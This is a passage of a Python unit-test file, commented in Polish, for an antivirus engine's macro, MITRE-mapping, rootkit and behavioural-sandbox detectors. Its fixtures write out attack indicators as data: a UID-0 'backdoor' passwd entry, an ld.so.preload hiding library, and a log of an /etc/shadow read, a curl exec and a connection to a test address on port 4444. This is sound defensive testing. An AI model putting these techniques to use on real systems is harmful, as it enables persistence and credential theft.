            doc_findings = [f.rule for f in result.findings if f.detector == "documents"]
            self.assertEqual(doc_findings, [], f"fałszywy alarm: {doc_findings}")
            self.assertEqual(result.verdict, Verdict.CLEAN.value)

    def test_ooxml_macro_is_detected_with_details(self):
        """Makro musi być nie tylko wykryte, ale i opisane (co robi)."""
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "malicious" / "faktura.docm")
            rules = [f.rule for f in result.findings]
            self.assertIn("ooxml_macro", rules, f"nie wykryto makra: {rules}")
            # Szczegóły są ważniejsze od samej flagi: analityk musi wiedzieć,
            # że makro uruchamia się samo i pobiera coś z sieci.
            self.assertIn("vba_autorun", rules)
            self.assertIn("macro_download", rules)

    def test_clean_docx_stays_clean(self):
        with tempfile.TemporaryDirectory() as tmp:
            result = self._scan(tmp, SAMPLES / "clean" / "raport.docx")
            doc_findings = [f.rule for f in result.findings if f.detector == "documents"]
            self.assertEqual(doc_findings, [], f"fałszywy alarm: {doc_findings}")


class TestMitreMapping(unittest.TestCase):
    def test_known_techniques_are_mapped(self):
        from avengine import mitre
        cases = {
            ("pe_heuristics", "api_hollowing"): "T1055.012",
            ("pe_heuristics", "api_ransomware"): "T1486",
            ("documents", "pdf_js_auto"): "T1204.002",
            ("rootkit", "ld_so_preload"): "T1574.006",
            ("archive", "nested_threat"): "T1566.001",
        }
        for (detector, rule), expected in cases.items():
            technique = mitre.map_finding(detector, rule)
            self.assertIsNotNone(technique, f"{detector}/{rule} nie zmapowane")
            self.assertEqual(technique.id, expected)

    def test_chain_bonus_grows_with_distinct_tactics(self):
        from avengine import mitre
        self.assertEqual(mitre.chain_bonus(1), 0)
        self.assertEqual(mitre.chain_bonus(2), 5)
        self.assertEqual(mitre.chain_bonus(3), 12)
        self.assertGreater(mitre.chain_bonus(4), mitre.chain_bonus(3))
        # Pojedynczy sygnał nie dostaje premii - inaczej każdy szum rósłby.
        self.assertEqual(mitre.chain_bonus(0), 0)


class TestCorrelation(unittest.TestCase):
    def _engine(self, tmp):
        engine = Engine(make_config(tmp))
        engine.load(load_yara=False)
        return engine

    def test_attack_chain_adds_points(self):
        """Spójny łańcuch sygnałów to coś więcej niż suma części."""
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            result = engine.scan_file(str(SAMPLES / "malicious" / "dropper.ps1"))
            rules = [f.rule for f in result.findings]
            self.assertIn("attack_chain", rules, f"brak korelacji: {rules}")

    def test_findings_carry_mitre_ids(self):
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            result = engine.scan_file(str(SAMPLES / "malicious" / "packed_loader.exe"))
            self.assertTrue(any(f.mitre for f in result.findings),
                            "żadne znalezisko nie ma przypisanej techniki ATT&CK")

    def test_heuristics_are_discounted_in_system_dirs(self):
        """Ten sam plik w katalogu systemowym dostaje mniej punktów heurystyki."""
        import os
        from avengine.detectors import correlation as corr
        with tempfile.TemporaryDirectory() as tmp:
            engine = self._engine(tmp)
            payload = bytes(range(256)) * 40
            home = os.path.join(tmp, "home", "user", "payload.bin")
            os.makedirs(os.path.dirname(home), exist_ok=True)
            Path(home).write_bytes(payload)
            result_home = engine.scan_bytes(home, payload)

            usr = os.path.join(tmp, "usr", "bin", "payload.bin")
            os.makedirs(os.path.dirname(usr), exist_ok=True)
            original = corr.TRUSTED_DIRS
            corr.TRUSTED_DIRS = original + (os.path.dirname(usr).lower(),)
            try:
                result_usr = engine.scan_bytes(usr, payload)
            finally:
                corr.TRUSTED_DIRS = original
            self.assertLessEqual(result_usr.score, result_home.score,
                                 "plik w katalogu systemowym powinien dostać rabat")


class TestIntegrityScanning(unittest.TestCase):
    """Testy rootkitów używają syntetycznych katalogów - nie ruszamy /proc."""

    def _scanner(self):
        from avengine.rootkit import IntegrityScanner
        return IntegrityScanner()

    def test_ld_so_preload_is_critical(self):
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / "ld.so.preload"
            fake.write_text("/usr/lib/libhide.so\n")
            original = rootkit.PRELOAD_PATH
            rootkit.PRELOAD_PATH = fake
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PRELOAD_PATH = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("ld_so_preload", rules)

    def test_hidden_process_is_critical(self):
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            proc = Path(tmp) / "proc"
            (proc / "999999").mkdir(parents=True)
            (proc / "999999" / "cmdline").write_bytes(b"/usr/lib/.hidden/kworker\x00")
            original = rootkit.PROC_PATH
            rootkit.PROC_PATH = proc
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PROC_PATH = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("hidden_process", rules)

    def test_extra_uid_zero_account(self):
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            fake = Path(tmp) / "passwd"
            fake.write_text("root:x:0:0:root:/root:/bin/bash\n"
                            "backdoor:x:0:0::/home/backdoor:/bin/bash\n")
            original = rootkit.PASSWD_PATH
            rootkit.PASSWD_PATH = fake
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PASSWD_PATH = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("uid_zero_account", rules)

    def test_suid_binary_in_world_writable_dir(self):
        import stat as statmod
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            target = Path(tmp) / ".evil"
            target.write_bytes(b"#!/bin/sh\n")
            target.chmod(target.stat().st_mode | statmod.S_ISUID)
            original = rootkit.SHADY_EXEC_DIRS
            rootkit.SHADY_EXEC_DIRS = (str(tmp) + "/",)
            try:
                report = self._scanner().scan()
            finally:
                rootkit.SHADY_EXEC_DIRS = original
            rules = [f["rule"] for f in report["findings"]]
            self.assertIn("suid_in_writable", rules)

    def test_hidden_socket_check_skipped_without_permissions(self):
        """Bez prawa odczytu /proc/*/fd test musi odpuścić, a nie alarmować."""
        from avengine import rootkit
        with tempfile.TemporaryDirectory() as tmp:
            proc = Path(tmp) / "proc"
            (proc / "1").mkdir(parents=True)
            net = proc / "net"
            net.mkdir()
            (net / "tcp").write_text(
                "  sl  local_address rem_address   st tx_queue rx_queue tr tm->when retrnsmt"
                "   uid  timeout inode\n"
                "   0: 00000000:006F 00000000:0000 0A 00000000:00000000 00:00000000 00000000"
                "     0        0 422 1 0000000000000000 100 0 0 10 0\n")
            original_proc, original_net = rootkit.PROC_PATH, rootkit.NET_TCP_PATHS
            rootkit.PROC_PATH = proc
            rootkit.NET_TCP_PATHS = (net / "tcp",)
            try:
                report = self._scanner().scan()
            finally:
                rootkit.PROC_PATH = original_proc
                rootkit.NET_TCP_PATHS = original_net
            rules = [f["rule"] for f in report["findings"]]
            self.assertNotIn("hidden_port", rules,
                             "fałszywy alarm: gniazdka bez widocznych deskryptorów")
            self.assertTrue(any("hidden_sockets" in s for s in report["skipped"]))




class TestBehaviorSandbox(unittest.TestCase):
    """Analiza behawioralna: uruchamiamy próbkę i patrzymy, co robi.

    Wymaga kompilatora C (gcc) do zbudowania interceptora wywołań libc.
    Próbki są własne i niegroźne: piszą tylko w katalogu piaskownicy, a
    użyty adres 192.0.2.x należy do zarezerwowanego zakresu testowego.
    """

    def _sandbox(self, tmp, timeout: int = 25):
        from avengine.behavior import BehaviorSandbox
        return BehaviorSandbox(Path(tmp), timeout=timeout)

    def test_interceptor_is_built(self):
        import shutil
        if not (shutil.which("gcc") or shutil.which("cc")):
            self.skipTest("brak kompilatora C")
        from avengine.behavior import build_interceptor
        with tempfile.TemporaryDirectory() as tmp:
            library = build_interceptor(Path(tmp))
            self.assertIsNotNone(library, "kompilacja interceptora nie powiodła się")
            self.assertTrue(Path(library).exists())

    def _skip_without_gcc(self):
        import shutil
        if not (shutil.which("gcc") or shutil.which("cc")):
            self.skipTest("brak kompilatora C")

    def test_malicious_behavior_is_detected(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "behav_dropper.py")
            self.assertEqual(report.error, "", report.error)
            self.assertTrue(report.executed)
            rules = {f.rule for f in report.findings}
            for expected in ("persistence_write", "credential_access", "network_c2",
                             "mass_file_write", "self_delete", "encrypted_content"):
                self.assertIn(expected, rules, f"nie wykryto {expected}: {sorted(rules)}")
            self.assertEqual(report.verdict, "malicious")

    def test_benign_behavior_stays_clean(self):
        """Zwykły skrypt nie może dostać ani punktu - to test na fałszywe alarmy."""
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "clean" / "behav_benign.sh")
            self.assertEqual(report.error, "", report.error)
            self.assertEqual(report.findings, [],
                             f"fałszywy alarm: {[f.rule for f in report.findings]}")
            self.assertEqual(report.verdict, "clean")

    def test_network_endpoints_are_parsed_correctly(self):
        """Pola CONNECT (rodzina/host/port) nie mogą się przesuwać."""
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "behav_dropper.py")
            endpoint = next((n for n in report.network if n["port"] == 4444), None)
            self.assertIsNotNone(endpoint, f"nie sparsowano połączenia: {report.network}")
            self.assertEqual(endpoint["host"], "192.0.2.1")
            self.assertEqual(endpoint["family"], "ipv4")

    def test_findings_carry_mitre_ids(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "behav_dropper.py")
            self.assertTrue(report.findings)
            for finding in report.findings:
                self.assertTrue(finding.mitre,
                                f"{finding.rule} nie ma przypisanej techniki ATT&CK")

    def test_report_is_serialisable(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "clean" / "behav_benign.sh")
            payload = json.loads(json.dumps(report.to_dict(), ensure_ascii=False))
            self.assertEqual(payload["verdict"], "clean")
            self.assertTrue(payload["limitations"], "raport musi wymieniać ograniczenia")
            self.assertIn("Analiza behawioralna", report.render_text())

    def test_windows_only_script_is_reported_not_run(self):
        self._skip_without_gcc()
        with tempfile.TemporaryDirectory() as tmp:
            report = self._sandbox(tmp).run(SAMPLES / "malicious" / "dropper.ps1")
            self.assertTrue(report.error, "skrypt PowerShell nie powinien być uruchomiony")
            self.assertFalse(report.executed)

    def test_log_parser_handles_every_event_kind(self):
        """Parser dziennika musi rozumieć każdy rodzaj zdarzenia interceptora."""
        from avengine.behavior import BehaviorSandbox
        with tempfile.TemporaryDirectory() as tmp:
            log = Path(tmp) / "behavior.log"
            log.write_text(
                "OPEN\t1\t/tmp/a.txt\twrite\n"
                "OPEN\t1\t/etc/shadow\tread\n"
                "EXEC\t1\t/usr/bin/curl\thttp://x/y\n"
                "DELETE\t1\t/tmp/b.txt\n"
                "MOVE\t1\t/tmp/c\t/tmp/d\n"
                "CONNECT\t1\tipv4\t192.0.2.1\t4444\n"
                "SOCKET\t1\tipv4\ttcp\n"
                "MKDIR\t1\t/tmp/e\n")
            events = BehaviorSandbox._parse_log(log)
            kinds = [e.kind for e in events]
            self.assertEqual(kinds, ["OPEN", "OPEN", "EXEC", "DELETE", "MOVE",
                                     "CONNECT", "SOCKET", "MKDIR"])
            connect = next(e for e in events if e.kind == "CONNECT")
            self.assertEqual(connect.path, "ipv4")
            self.assertEqual(connect.extra, "192.0.2.1\t4444")


if __name__ == "__main__":
    unittest.main(verbosity=2)
